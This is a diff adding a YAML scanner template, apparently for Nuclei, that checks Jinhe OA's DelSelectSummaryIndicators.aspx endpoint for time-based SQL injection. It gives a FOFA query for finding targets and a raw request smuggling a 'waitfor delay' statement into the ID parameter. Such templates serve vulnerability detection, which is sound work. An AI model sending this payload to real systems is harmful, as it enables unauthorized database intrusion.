@@ -1,0 +1,36 @@
+id: poc-yaml-jinher-jhsoft-delselectsummaryindicators-aspx-sqli
+info:
+  name: 金和OA DelSelectSummaryIndicators.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.dossier/DelSelectSummaryIndicators.aspx/?ID=1);waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: word
+        part: body
+        words:
+          - "Error"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
